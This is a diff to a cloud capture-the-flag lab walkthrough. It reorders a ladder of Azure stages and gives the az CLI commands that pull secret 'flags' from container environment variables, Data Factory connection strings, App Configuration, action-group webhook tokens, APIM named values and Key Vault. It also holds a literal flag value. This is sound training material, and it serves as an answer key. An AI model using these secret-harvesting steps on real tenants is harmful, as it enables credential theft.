@@ -20,14 +20,17 @@ identity, so the role grants are genuine.
 ## The ladder
 
 ```
-Bootstrap   public blob (anonymous)            --submit--> Reader on the APIM service
-Stage 1     APIM named value (Reader)          --submit--> App Configuration Data Reader
-Stage 2     App Configuration (Data Reader)    --submit--> Reader on the Container Instance
-Stage 3     Container Instance env (Reader)    --submit--> Reader on the Data Factory
-Stage 4     Data Factory linked service (Reader)--submit--> Reader on the Monitor action group
-Stage 5     Monitor action group (Reader)      --submit--> Key Vault Secrets User
+Bootstrap   public blob (anonymous)            --submit--> Reader on the Container Instance
+Stage 1     Container Instance env (Reader)    --submit--> Reader on the Data Factory
+Stage 2     Data Factory linked service (Reader)--submit--> App Configuration Data Reader
+Stage 3     App Configuration (Data Reader)    --submit--> Reader on the Monitor action group
+Stage 4     Monitor action group (Reader)      --submit--> Reader on the APIM service
+Stage 5     APIM named value (Reader)          --submit--> Key Vault Secrets User
 Final       Key Vault secret (Secrets User)               the flag
 ```
+
+APIM is placed last (before the vault) on purpose: it is the slowest resource to
+provision, so it has the most time to be ready before a player reaches it.
 
 Each stage is one of the standalone labs' mechanisms (`apim_named_value`,
 `app_configuration_secrets`, `container_instance_env`,
@@ -54,30 +57,12 @@ Submit it to the gatekeeper, then log in as the attacker (once):
 ```bash
 GK="<gatekeeper-url>"
 curl -s -X POST "$GK/unlock" -H 'Content-Type: application/json' \
-  -d '{"flag":"CUMULONIMBUS{unlock_apim_reader}"}'
+  -d '{"flag":"CUMULONIMBUS{g4t3k33p3r_b00tstr4p}"}'
 
 az login --username <attacker_upn> --password <attacker_password>
 ```
 
-### Stage 1 — APIM named value (Reader on the APIM service)
-
-```bash
-az apim nv show -g <rg> --service-name <apim-name> --named-value-id flag-key --query value -o tsv
-# the `next-hop` named value points to the App Configuration store
-```
-
-Submit that flag → unlocks **App Configuration Data Reader**.
-
-### Stage 2 — App Configuration (Data Reader)
-
-```bash
-az appconfig kv list --name <config-store> --auth-mode login --all -o table
-```
-
-`secrets/api-key` is the flag; `secrets/next-hop` names the Container Instance.
-Submit the flag → unlocks **Reader on the Container Instance**.
-
-### Stage 3 — Container Instance env vars (Reader)
+### Stage 1 — Container Instance env vars (Reader on the container)
 
 ```bash
 az container show -g <rg> -n <container-group> \
@@ -87,7 +72,7 @@ az container show -g <rg> -n <container-group> \
 `SECRET_FLAG` is the flag; `NEXT_HOP` names the Data Factory. Submit → unlocks
 **Reader on the Data Factory**.
 
-### Stage 4 — Data Factory linked service (Reader)
+### Stage 2 — Data Factory linked service (Reader)
 
 ```bash
 az extension add --name datafactory 2>/dev/null
@@ -96,10 +81,18 @@ az datafactory linked-service show -g <rg> --factory-name <adf-name> \
 ```
 
 The `AccountKey=` in the connection string is the flag; the `description` names
-the Monitor action group. Submit → unlocks **Reader on the Monitor action
-group**.
+the App Configuration store. Submit → unlocks **App Configuration Data Reader**.
 
-### Stage 5 — Monitor action group webhook token (Reader)
+### Stage 3 — App Configuration (Data Reader)
+
+```bash
+az appconfig kv list --name <config-store> --auth-mode login --all -o table
+```
+
+`secrets/api-key` is the flag; `secrets/next-hop` names the Monitor action group.
+Submit the flag → unlocks **Reader on the Monitor action group**.
+
+### Stage 4 — Monitor action group webhook token (Reader)
 
 ```bash
 az monitor action-group show -g <rg> -n <action-group> \
@@ -107,8 +100,17 @@ az monitor action-group show -g <rg> -n <action-group> \
 ```
 
 The `security-alerts` webhook URL contains the flag in its `token=` parameter;
-the `vault-pointer` webhook names the Key Vault and secret. Submit the flag →
-unlocks **Key Vault Secrets User**.
+the `apim-pointer` webhook names the APIM service. Submit the flag → unlocks
+**Reader on the APIM service**.
+
+### Stage 5 — APIM named value (Reader on the APIM service)
+
+```bash
+az apim nv show -g <rg> --service-name <apim-name> --named-value-id flag-key --query value -o tsv
+# the `next-hop` named value gives the Key Vault name and secret
+```
+
+Submit that flag → unlocks **Key Vault Secrets User**.
 
 ### Final — Key Vault secret
 
